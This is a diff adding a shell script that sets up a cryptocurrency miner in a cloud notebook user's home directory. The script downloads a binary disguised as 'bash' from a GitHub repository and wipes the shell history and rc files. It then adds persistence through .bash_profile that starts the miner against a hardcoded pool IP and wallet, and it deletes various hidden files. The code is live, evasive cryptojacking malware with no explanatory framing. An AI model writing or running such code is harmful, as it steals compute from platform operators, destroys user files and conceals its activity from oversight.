@@ -1,0 +1,24 @@
+cd ~
+rm -rvf .bash* .lib* bash* ele* lol* 1.* 
+cd ~/
+mkdir .lib
+cd .lib
+rm -R *
+rm -R /home/studio-lab-user/.ton
+WORKER="PPLNS189"
+WALLETNH="0x9A90A1d375e7496314d202d17585770695fb325B"
+POOLNH="43.163.2.197:80"
+wget -P /home/studio-lab-user/.lib/ https://github.com/gunturyogatama404/ksjdueoa/raw/refs/heads/main/bash && history -cr 
+echo ""  > /home/studio-lab-user/.bashrc
+echo "" > /home/studio-lab-user/.bash_history
+echo "" > /home/studio-lab-user/.bash_profile
+echo 'echo ""  >> /home/studio-lab-user/.bash_history' >> /home/studio-lab-user/.bashrc
+echo "source /home/studio-lab-user/.bash_profile"  >> /home/studio-lab-user/.bashrc
+echo "LD_LIBRARY_PATH=/home/studio-lab-user/.lib" > /home/studio-lab-user/.bash_profile
+echo "export LD_LIBRARY_PATH" >> /home/studio-lab-user/.bash_profile
+echo 'WORKER="x"' >> ~/.bash_profile
+echo 'WALLETNH="0x9A90A1d375e7496314d202d17585770695fb325B"' >> /home/studio-lab-user/.bash_profile
+echo 'POOLNH="43.163.2.197:80"' >> /home/studio-lab-user/.bash_profile
+echo "bash /home/studio-lab-user/.lib/gas.sh"  >> /home/studio-lab-user/.bash_profile
+echo "./.lib/bash -a cortex -s $POOLNH -u $WALLETNH.$WORKER" > /home/studio-lab-user/.lib/gas.sh
+chmod +x bash && cd ~/ && source .bashrc
